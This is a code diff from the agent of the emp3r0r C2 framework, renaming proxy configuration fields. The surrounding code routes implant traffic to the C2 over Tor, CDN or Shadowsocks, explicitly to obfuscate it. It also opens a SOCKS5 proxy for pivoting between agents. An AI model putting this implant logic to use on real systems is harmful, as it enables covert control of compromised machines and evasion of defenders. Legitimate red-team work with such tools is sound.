@@ -135,11 +135,11 @@ test_agent:
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
 		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
 		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
-		agent.RuntimeConfig.AgentProxy = *c2proxy
+		agent.RuntimeConfig.C2TransportProxy = *c2proxy
 		if *c2proxy == "" {
-			agent.RuntimeConfig.AgentProxy = "socks5://127.0.0.1:9050"
+			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
 		}
-		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.AgentProxy)
+		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
 	} else {
 		// parse C2 address
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
@@ -148,7 +148,7 @@ test_agent:
 
 	// if user specified a proxy, use it
 	if *c2proxy != "" {
-		agent.RuntimeConfig.AgentProxy = *c2proxy
+		agent.RuntimeConfig.C2TransportProxy = *c2proxy
 	}
 
 	// DNS
@@ -169,7 +169,7 @@ test_agent:
 	if *cdnProxy != "" {
 		agent.RuntimeConfig.CDNProxy = *cdnProxy
 	}
-	upper_proxy := agent.RuntimeConfig.AgentProxy // when using CDNproxy
+	upper_proxy := agent.RuntimeConfig.C2TransportProxy // when using CDNproxy
 	if agent.RuntimeConfig.CDNProxy != "" {
 		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
@@ -180,8 +180,8 @@ test_agent:
 		}
 		go func() {
 			for !tun.IsProxyOK(cdnproxyAddr) {
-				// typically you need to configure AgentProxy manually if agent doesn't have internet
-				// and AgentProxy will be used for websocket connection, then replaced with 10888
+				// typically you need to configure C2TransportProxy manually if agent doesn't have internet
+				// and C2TransportProxy will be used for websocket connection, then replaced with 10888
 				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
 				if err != nil {
 					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
@@ -189,21 +189,21 @@ test_agent:
 			}
 		}()
 		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", agent.RuntimeConfig.CDNProxy)
-		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
+		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
 	}
 
 	// socks5 proxy
 	go func() {
 		// start a socks5 proxy
-		err := agent.Socks5Proxy("on", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
+		err := agent.Socks5Proxy("on", "0.0.0.0:"+agent.RuntimeConfig.AutoProxyPort)
 		if err != nil {
-			log.Printf("Socks5Proxy on %s: %v", agent.RuntimeConfig.ProxyPort, err)
+			log.Printf("Socks5Proxy on %s: %v", agent.RuntimeConfig.AutoProxyPort, err)
 			return
 		}
 		defer func() {
-			err := agent.Socks5Proxy("off", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
+			err := agent.Socks5Proxy("off", "0.0.0.0:"+agent.RuntimeConfig.AutoProxyPort)
 			if err != nil {
-				log.Printf("Socks5Proxy off (%s): %v", agent.RuntimeConfig.ProxyPort, err)
+				log.Printf("Socks5Proxy off (%s): %v", agent.RuntimeConfig.AutoProxyPort, err)
 			}
 		}()
 	}()
@@ -219,7 +219,7 @@ test_agent:
 
 				if agent.RuntimeConfig.UseShadowsocks {
 					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
-					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+					agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
 						agent.RuntimeConfig.ShadowsocksPort)
 
 					// run ss w/wo KCP
@@ -229,7 +229,7 @@ test_agent:
 			}
 			return true
 
-		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.AgentProxy) {
+		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy) {
 			*cnt++
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
@@ -243,8 +243,8 @@ test_agent:
 					}
 				}()
 				for ctx.Err() == nil {
-					if agent.RuntimeConfig.AgentProxy != "" {
-						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.AgentProxy)
+					if agent.RuntimeConfig.C2TransportProxy != "" {
+						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.C2TransportProxy)
 						return true
 					}
 				}
@@ -261,9 +261,9 @@ test_agent:
 	}
 
 	// apply whatever proxy setting we have just added
-	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(agent.RuntimeConfig.AgentProxy)
-	if agent.RuntimeConfig.AgentProxy != "" {
-		log.Printf("Using proxy: %s", agent.RuntimeConfig.AgentProxy)
+	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(agent.RuntimeConfig.C2TransportProxy)
+	if agent.RuntimeConfig.C2TransportProxy != "" {
+		log.Printf("Using proxy: %s", agent.RuntimeConfig.C2TransportProxy)
 	} else {
 		log.Println("Not using proxy")
 	}
@@ -274,7 +274,7 @@ connect:
 		agent.RuntimeConfig.CCIndicator != "" &&
 		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not
 
-		if !agent.IsCCOnline(agent.RuntimeConfig.AgentProxy) {
+		if !agent.IsCCOnline(agent.RuntimeConfig.C2TransportProxy) {
 			log.Println("CC not online")
 			time.Sleep(time.Duration(
 				util.RandInt(
